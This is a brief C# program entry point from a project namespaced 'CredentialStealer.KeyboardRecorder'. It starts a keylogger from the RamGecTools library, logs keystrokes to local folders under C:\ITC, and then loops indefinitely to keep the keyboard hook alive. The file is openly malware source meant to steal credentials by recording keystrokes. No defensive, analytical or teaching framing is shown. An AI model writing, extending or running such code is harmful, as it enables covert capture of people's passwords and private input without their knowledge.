using RamGecTools;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CredentialStealer.KeyboardRecorder
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\logsrc", @"C:\ITC\logdest");
            while (true)
            {
                Application.DoEvents();
            }
        }
    }
}
